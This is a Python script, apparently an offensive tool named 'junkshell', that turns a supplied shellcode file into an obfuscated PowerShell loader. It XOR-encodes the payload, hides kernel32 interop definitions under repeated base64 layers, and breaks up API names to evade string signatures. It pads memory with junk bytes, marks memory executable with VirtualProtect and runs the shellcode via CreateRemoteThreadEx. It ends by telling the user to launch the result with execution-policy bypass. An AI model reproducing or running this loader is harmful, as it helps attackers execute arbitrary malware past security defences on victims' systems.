"""
junkshell v0.1 - shellcode loader for powershell
author: tg: @synawk tw: @synaw_k
website: synawk.com
"""

import base64
import random
import string
import argparse
import sys

words = [
    "process", "thread", "memory", "user"
]
prefix = [
    "auto", "sys", "win", "app", "net", "data", "file", "random"
]
action = [
    "list", "get", "set", "add", "remove", "create", "delete", "update", "find", "search", "open", "close", "read", "write", "load", "unload",
    "link", "unlink", "reduce"
]


def gen_alpha_upper(length=3):
    # generate random string
    suffix = ''.join(random.choice(string.ascii_uppercase)
                     for _ in range(length))
    options = [prefix, words, action]
    random.shuffle(options)
    # upper case first letter
    for _ in range(length):
        result = "_".join([random.choice(i).capitalize() for i in options])
    return result + suffix


def gen_alpha(length=3):
    # generate random string
    suffix = ''.join(random.choice(string.ascii_lowercase)
                     for _ in range(length))
    options = [prefix, words, action]
    for _ in range(length):
        result = "_".join([random.choice(i) for i in options])

    return result + "_" + suffix


class Obfuscator():
    def __init__(self):
        self.key = random.randint(44, 255)

    def get_key(self):
        return self.key


class XOREncoder(Obfuscator):
    def encode(self, data):
        return bytes([x ^ self.key for x in data])

    def get_decoder_string(self):
        return f"""$sh =  (${var("shellcode")}[$i] + {hex(self.key)}) - 2 * (${var("shellcode")}[$i] -band {hex(self.key)})"""


class RotateLeftEncoder(Obfuscator):
    # soon
    def encode(self, data):
        key = random.randint(1, 7)
        return bytes([(x << key) & 0xff for x in data])

    def get_decoder_string(self):
        return f"""$sh = ${var("shellcode")}[$i] -shl 0x{random.randint(1, 7)}"""


class Builder():
    def __init__(self):
        self.encoders = [XOREncoder]
        self.selected_encoder = random.choice(self.encoders)()
        self.shellcode = bytes()

    def from_file(self, filename):
        handle = open(filename, "rb")
        self.shellcode = handle.read()
        self.shellcode = self.selected_encoder.encode(self.shellcode)
        handle.close()
        return self


class ShellcodeBuilder(Builder):
    def encode(self):
        sh = bytes([x for x in self.shellcode])
        return ",".join(["0x{:02x}".format(x) for x in sh])

    def get_decoder_string(self):
        return self.selected_encoder.get_decoder_string()


class PefileBuilder(Builder):
    def encode(self):
        pefile = bytes([x for x in self.shellcode])
        return ",".join(["0x{:02x}".format(x) for x in pefile])


"""
junkshell v0.2 - shellcode loader for powershell 
shellcode
"""


parser = argparse.ArgumentParser(
    description='junkshell - A shellcode loader for Powershell')
# parser.add_argument('-p', '--pefile', help='PeFile to load')
parser.add_argument('-s', '--shellcode', help='Shellcode file to load')
# parser.add_argument('-e', '--encoded', help='Encoded powershell command [only using -s]')
parser.add_argument('-o', '--output', help='Output file', required=True)

args = parser.parse_args()
if False:  # args.pefile:
    # load pe file
    builder = PefileBuilder()
    builder = builder.from_file(args.pefile)
    # it works only shellcode for now
elif args.shellcode:
    builder = ShellcodeBuilder()
    builder = builder.from_file(args.shellcode)
else:
    print("[!] You need to specify a shellcode or a pe file")
    sys.exit(0)


class_name = gen_alpha_upper()
bypass_lol = gen_alpha()
toomuch_va = gen_alpha()
toomuch_crt = gen_alpha()
k32_instance_var = gen_alpha()
bin_shellcode = builder.encode()
blocks = [

    f"""[UnmanagedFunctionPointer(CallingConvention.Cdecl)]    public delegate IntPtr VAStub(IntPtr a, UIntPtr b, UInt32 c, UInt32 d);
    """,
    f"""
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate IntPtr CRTStub(IntPtr h, IntPtr a, IntPtr b, IntPtr c, IntPtr d, UInt32 e,UInt32 p,  out IntPtr f);
    """,
    f"""
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibrary( [MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    """,
    f"""
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string nFunction);
    """,
    f"""
    public static IntPtr {bypass_lol}(IntPtr hModule, string nFunction){{
        return GetProcAddress(hModule, nFunction.Replace("_",""));
    }}
    """,
    f"""
    public static Delegate {toomuch_va}(IntPtr ptr){{
            return Marshal.GetDelegateForFunctionPointer(ptr, typeof(VAStub));
    }}
    """,
    f"""
    public static Delegate {toomuch_crt}(IntPtr ptr){{
        return Marshal.GetDelegateForFunctionPointer(ptr, typeof(CRTStub));
    }}
    """,
    f"""
    [DllImport("msvcrt.dll")]
    public static extern IntPtr memset(IntPtr dest, uint src, uint count);
    """,
    f"""
    [DllImport("msvcrt.dll")]
    public static extern IntPtr malloc(uint src);
    """,
    f"""
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr b,UIntPtr s,uint p,out uint o);
    """
]
random.shuffle(blocks)
__header = f"""
using System;
using System.Runtime.InteropServices;


public static class {class_name}
    {{
    {"".join(blocks)}
}}

"""
variables = {}


def var(name=""):
    if name not in variables:
        variables[name] = gen_alpha()
    return variables[name]


def generate_junks(len_junks=3, base_var="junk"):
    options = [
        [0x48, 0x31, 0xc0, 0x90],
        [0x48, 0x31, 0xc9, 0x90],
        [0x48, 0x31, 0xd2, 0x90],
        [0x66, 0x31, 0xc0, 0x90],
        [0x66, 0x50, 0x66, 0x58],
        [0x90, 0x90, 0x90, 0x90]
    ]
    junks = []
    names = []
    for n in range(len_junks):
        # 4 bytes
        ro = options[random.randint(0, len(options) - 1)]
        name = "$"+base_var + str(n)
        names.append(name)
        junks.append("[Byte[]]{}=0x{:02x},0x{:02x},0x{:02x},0x{:02x}"
                     .format(name, ro[0], ro[1], ro[2], ro[3]))
    composer = f"${base_var} = @({','.join(names)})"

    return "\n".join(junks) + "\n" + composer


length_junks = random.randint(6, 22)
junk_base_var = gen_alpha()

crthread = "CreateRemoteTh__readEx"
crthread = "".join("{}{}".format(c, "_" * random.randint(0, 3))
                   for c in crthread)


def adv_b64(data, times):
    for i in range(times):
        data = base64.b64encode(data.encode()).decode()
    return data


LIST_JUNKS = [
    f"""
function {var('UselessFunction')} {{
    param([string]${var('whatever')})
    return ${var('whatever')} | Out-Null
}}
{var('UselessFunction')} -{var('whatever')} {var('random_string')}
""", f"""
try {{
    ${var('junk1')} = 1 + 1
    ${var('junk2')} = 2 + 2
}} catch {{
    ${var('junk1')} = $_.Exception
}}""", f"""
foreach (${var('junk1')} in (1..5)) {{
    $null = ${var('junk1')} * 3
}}"""
]


def junk_code():
    return random.choice(LIST_JUNKS)


buffer = ""
rn_times_encoded = random.randint(3, 15)
data_compose = adv_b64(__header, 1)
n = random.randint(45, 65)
data_compose = [adv_b64(data_compose[i:i+n], rn_times_encoded)
                for i in range(0, len(data_compose), n)]
buffer += f"""
function {var('add_type')} {{
    param (
        [string]${var('vt_class')}
    )
    Add-Type -TypeDefinition ${var('vt_class')}
}}
function {var('Base64DecodeFunction')} {{
    param (
        [string]${var('Base64String')},
        [int]${var('times')}
    )
    ${var('decoded')} = ${var('Base64String')}
    for ($i = 0; $i -lt ${var('times')}; $i++) {{
        ${var('bytes')} = [Convert]::FromBase64String(${var('decoded')})
        ${var('decoded')} = [System.Text.Encoding]::UTF8.GetString(${var('bytes')})
    }}
    return ${var('decoded')}
}}
"""

buffer += f"${var('load_library_var')} = ''\n"
for i in range(len(data_compose)):
    buffer += f"""${var("load_library_var")} += {var('Base64DecodeFunction')} "{data_compose[i]}" {rn_times_encoded}\n"""
    buffer += "\n"

buffer += f"""
${var('tmp')} = [Convert]::FromBase64String(${var("load_library_var")})
${var('tmp')} = [System.Text.Encoding]::UTF8.GetString(${var('tmp')})
{junk_code()}
{junk_code()}
{var('add_type')} ${var('tmp')}

${var("k32_instance_var")} = [{class_name}]
${var("size_memory_var")} = {random.randint(10000, 20000)}
{junk_code()}

{generate_junks(length_junks, junk_base_var)}

[Byte[]]${var("shellcode")} = {bin_shellcode}
{junk_code()}

${var("size_shellcode_var")} = ${var("shellcode")}.Length
${var("size_junks_var")} = ${var("size_memory_var")} * 4
${var("size_total_var")} = ${var("size_junks_var")} + ${var("size_shellcode_var")}

${var("win32_var")} = New-Object System.Object
${var("hmodule_var")} = ${var("k32_instance_var")}::LoadLibrary("kernel32.dll")
{junk_code()}

${var("crt_addr")}   = ${var("k32_instance_var")}::{bypass_lol}(${var("hmodule_var")}, "{crthread}")
${var("crt_pointer")} = ${var("k32_instance_var")}::{toomuch_crt}(${var("crt_addr")})
${var("win32_var")} | Add-Member NoteProperty -Name fnCRT -Value ${var("crt_pointer")}

${var("ptr_var")}= ${var("k32_instance_var")}::malloc([UInt32]${var("size_total_var")})

${var("chunks")}=0
${var("min_index")} = 0
${var("max_index")} = ${junk_base_var}.Length - 1
{junk_code()}

while(${var("chunks")} -le ${var("size_junks_var")}/4){{
        $random = New-Object -TypeName System.Random
        $cc=${var("k32_instance_var")}::VirtualProtect([IntPtr](${var("ptr_var")}.toInt64()+${var("chunks")}), [UInt32]4, [UInt32]0x40, [ref][UInt32]0)
        ${var("random_index")} = $random.Next($minIndex, $maxIndex)
        ${var("curr_junk")} = ${junk_base_var}[${var("random_index")}]

        $c=${var("k32_instance_var")}::memset([IntPtr](${var("ptr_var")}.ToInt64()+(${var("chunks")})),${var("curr_junk")}[0] , 1)
        ${var("chunks")}+=1
        $c=${var("k32_instance_var")}::memset([IntPtr](${var("ptr_var")}.ToInt64()+(${var("chunks")})),${var("curr_junk")}[1] , 1)
        ${var("chunks")}+=1
        $c=${var("k32_instance_var")}::memset([IntPtr](${var("ptr_var")}.ToInt64()+(${var("chunks")})),${var("curr_junk")}[2] , 1)
        ${var("chunks")}+=1
        $c=${var("k32_instance_var")}::memset([IntPtr](${var("ptr_var")}.ToInt64()+(${var("chunks")})),${var("curr_junk")}[3] , 1)
        ${var("chunks")}+=1
}}
{junk_code()}

for ($i=0;$i -le (${var("shellcode")}.Length-1);$i++) {{
    $cc=${var("k32_instance_var")}::VirtualProtect([IntPtr](${var("ptr_var")}.toInt64()+${var("chunks")}+$i), [UInt32]1, [UInt32]0x40, [ref][UInt32]0)
    {junk_code()}
    {builder.get_decoder_string()}
    $c = ${var("k32_instance_var")}::memset([IntPtr](${var("ptr_var")}.ToInt64()+${var("chunks")}+$i), $sh , 1)

}}
{junk_code()}

$p = 0
$o = ${var("win32_var")}.fnCRT.Invoke(-1, 0, 0, ${var("ptr_var")}, 0, 0, 0, [ref]$p)

$f = Get-Random -Maximum 10
while([UInt32]$f -ne ([UInt32]6)){{
    $f = Get-Random -Maximum 10
}}
"""

# write a file to output arg
if args.output:
    with open(args.output, "w") as f:
        f.write(buffer)
        f.close()

print("\n[!]" + " " * 10 + "Powershell script generated" + " " * 10 + "[!]\n")
print("You should run the powershell script below:\n")
print(">> powershell.exe -exec Bypass -File " + args.output, "<<")
print("")
